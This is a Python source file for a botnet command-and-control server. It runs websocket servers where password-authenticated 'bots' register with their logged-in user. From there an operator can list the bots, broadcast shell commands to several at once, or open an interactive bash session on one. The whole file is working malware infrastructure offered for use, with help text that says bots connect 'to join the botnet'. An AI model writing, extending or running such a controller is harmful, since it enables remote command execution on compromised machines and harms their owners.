from typing import List, Union

import click
from prettytable import PrettyTable

from bot import Bot
from utils import hash_sha256, is_num, Id, configure_logging

import asyncio
import websockets
import logging

from websockets.server import WebSocketServerProtocol as WebSocketConn
from websockets.exceptions import ConnectionClosedError


logger = logging.getLogger(__name__)

CLI_OPTIONS = f'Enter: \n' \
    f'* "0" - to print bot clients collection\n' \
    f'* Indexes of clients separated by space to send bash command to\n' \
    f'* Index of one client to jump into bash (send "exit" for termination)\n'


class Context:
    def __init__(self, plain_password: str):
        self.pass_hash = hash_sha256(plain_password)
        self.bots: List[Bot] = []

    def get_bot(self, idx: int) -> Union[Bot, None]:
        try:
            return list(filter(lambda x: x.idx == idx, self.bots))[0]
        except Exception:
            return None

    async def add_bot(self, ws: WebSocketConn):
        # First the client sends logged in user
        user = await ws.recv()
        try:
            remote_adr, _ = ws.remote_address
            new_bot = Bot(
                Id.next(),
                remote_adr,
                ws,
                user.strip("\n") if user else "--unknown--"
            )

            self.bots.append(new_bot)
            logger.info(f"Added {new_bot}")
            return new_bot

        except Exception as e:
            logger.error(f"Exception {e} during adding new bot client")
            return None

    def remove_bot_client(self, bot: Bot):
        if bot in self.bots:
            self.bots.remove(bot)
            logger.info(f"{bot} removed")

    def get_database_summary(self) -> str:
        x = PrettyTable()
        x.field_names = ["Index", "Remote address", "Logged as"]
        for bot in self.bots:
            x.add_row([bot.idx, bot.remote_address, bot.user])
        return f"\n{x}"


class CommandControl:
    def __init__(self, ctx: Context):
        self.ctx = ctx

    async def bot_authenticated(self, ws: WebSocketConn):
        pass_hash = await ws.recv()
        return pass_hash == self.ctx.pass_hash

    async def handle_bot(self, ws: WebSocketConn, _: str):
        if not await self.bot_authenticated(ws):
            logger.info(f"Bot client {ws.remote_address} not authenticated")
            await ws.close()
            return

        bot = await self.ctx.add_bot(ws)
        if bot:
            await ws.keepalive_ping()
            self.ctx.remove_bot_client(bot)

    async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
        await ws.send("Enter command:")
        cmd = await ws.recv()

        async def exec_command(bot_idx: int):
            cur_bot = self.ctx.get_bot(bot_idx)
            if not cur_bot:
                await ws.send(f"Bot {bot_idx} does not exist")
                return

            stdout = await cur_bot.send_command(cmd)
            if stdout is False:
                self.ctx.remove_bot_client(cur_bot)
                await ws.send(
                    f"Connection with bot {cur_bot} was closed...")
            else:
                stdout = f"Bot {bot_idx}:\n{stdout}"
                await ws.send(stdout)

        # Execute all commands simultaneously in case it takes long time to
        # finish
        await asyncio.gather(*[exec_command(i) for i in idxs])

    async def start_bash(self, ws: WebSocketConn, bot_idx: int):
        bot = self.ctx.get_bot(bot_idx)
        if not bot:
            await ws.send(f"Bot {bot_idx} does not exist")
            return

        while True:
            cmd = await ws.recv()
            if cmd.strip("\n").lower() == "exit":
                break

            stdout = await bot.send_command(cmd)
            if ws.closed or stdout is False:
                self.ctx.remove_bot_client(bot)
                await ws.send(f"Connection with bot {bot.idx} was closed...")
                break

            await ws.send(stdout)

    async def handle_cli(self, cli_ws: WebSocketConn, _: str):
        logger.info("Command and control connection established")
        try:
            while True:
                await cli_ws.send(CLI_OPTIONS)

                # To not care about empty lines
                choice = None
                while not choice:
                    choice = (await cli_ws.recv())

                if choice == "0":
                    await cli_ws.send(self.ctx.get_database_summary())
                    continue

                # Validate the input
                nums = choice.split(" ")
                if any(filter(lambda x: not is_num(x), nums)):
                    await cli_ws.send("Unknown input")
                    continue

                # Start bash with this client
                if len(nums) == 1 and nums[0]:
                    await self.start_bash(cli_ws, int(nums[0]))
                    continue

                # Execute commands
                await self.execute_commands(cli_ws, [int(x) for x in nums])
        except ConnectionClosedError:
            logger.info("Command and control connection closed")


@click.command()
@click.option(
    "--cac_port",
    "-cp",
    type=click.INT,
    default=6767,
    help="Port where command and control center listens",
)
@click.option(
    "--bot_port",
    "-bp",
    type=click.INT,
    default=6777,
    help="Port where bots should connect in order to join the botnet",
)
@click.option(
    "--secret_password",
    "-s",
    default="password",
    help="Password needed for bots to connect",
)
@click.option(
    "--ip_address",
    "-i",
    default="0.0.0.0",
    help="Ip address for server to listen on",
)
def main(cac_port: int, bot_port: int, ip_address: str, secret_password: str):
    configure_logging()
    ctx = Context(secret_password)
    cac = CommandControl(ctx)

    bot_clients_server = websockets.serve(cac.handle_bot, ip_address, bot_port)
    control_server = websockets.serve(cac.handle_cli, ip_address, cac_port)

    logger.info(f"Starting bot client server on {ip_address}:{bot_port}")
    asyncio.get_event_loop().run_until_complete(bot_clients_server)

    logger.info(f"Starting control server on {ip_address}:{cac_port}")
    asyncio.get_event_loop().run_until_complete(control_server)
    asyncio.get_event_loop().run_forever()


if __name__ == "__main__":
    main()
